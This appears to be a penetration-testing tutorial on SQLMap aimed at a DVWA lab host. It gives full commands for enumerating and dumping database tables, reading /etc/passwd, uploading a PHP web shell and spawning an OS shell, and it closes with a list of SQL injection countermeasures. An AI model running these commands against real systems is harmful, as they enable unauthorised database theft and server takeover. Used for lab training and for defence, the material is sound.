
SQLMap is a popular open-source penetration testing tool that automates the testing and exploitation of SQL injection vulnerabilities.
When SQLmap detects an SQL injection vulnerability in a provided parameter, SQLMap can automatically exploit it to fetch the database contents, access the underlying file system, interact with the local file system or even spawn an OS shell. 
SQLMap supports a wide range of database management systems such as MySQL, PostgreSQL, Microsoft SQL Server, Oracle, and many more.

• Verbosity level
• Testing Authenticated Session ID 
• Enumerating the Database 
• Downloading and Uploading Files
• SQLMap OS-Shell
• SQL Injection countermeasures


➜ Verbosity level

The default setting when no verbosity level is specified is level 1

0: Show only Python tracebacks, error and critical messages.
1: Show also information and warning messages.
2: Show also debug messages.
3: Show also payloads injected.
4: Show also HTTP requests.
5: Show also HTTP responses’ headers.
6: Show also HTTP responses’ page content.


➜ Testing Authenticated Session ID

sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --batch
sqlmap -u " http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --banner


➜ Enumerating the Database
 
sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --dbs
sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --tables
sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --columns --current-db
sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --dump --current-db -T users
sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --dump -T users -v 0

sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --dbs -v 3  #  which payloads is SQLMap using


➜ Downloading and Uploading Files

With the –file-read option, we can read and download files from the target host to our attack box. 
With the –file-write and –file-dest options, we can upload files from the attack box to the target host. 

sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --file-read=/etc/passwd
sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --file-write="/tmp/shell.php" --file-dest="/var/www/shell.php"


➜ SQLMap OS-Shell

We can also use the built-in os-shell function to execute system commands. SQLMap returns a shell (indicated by the os-shell>) to run commands on the underlying system. 

sqlmap -u "http://10.11.1.250/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=5ee561bcdd7a6e01960b0ceded6b1f3b; security=low" --batch --dbms="MySQL 5.0" --os-shell


➜ SQL Injection countermeasures

Generally speaking, SQL injection vulnerabilities can be easily avoided in your code. Most such vulnerabilities are introduced by using dynamic queries that entail some kind of user input.

Countermeasures include:

• Use prepared statements with parameterized queries. Prepared statements are effective against SQL injection attacks when properly implemented.
• Use stored procedures. While not always safe from SQL injection they can be implemented in a safe way by using parameters instead of dynamic user input.
• Apply the principle of least privileges and permissions to database user accounts. Restrict access to databases and tables and functions will minimize the impact if the server is breached and limit an attacker’s privileges on the database server.
• Create a role for executing stored procedures with execute only rights instead of a role that has full rights.
• Validate all untrusted data, such as user input, by constraining and sanitizing all input server side. There are many ways to validate user input, a good start is to check the input for type, length and range. You should also blacklist characters that might pose a risk, or even better whitelist those characters allowed as user input. Use escape routines to handle special characters.
• Perform validation of untrusted data on the server side. Client-side validation can easily be circumvented using a browser and additional tools.
• Do not disclose error information by using structured exception handling.
• Encrypt sensitive data and use strong, secure hashing algorithms for passwords.
• Use a Web Application Firewall (WAF) to protect web applications.



https://sqlmap.org/
https://github.com/sqlmapproject/sqlmap/wiki/Usage

*






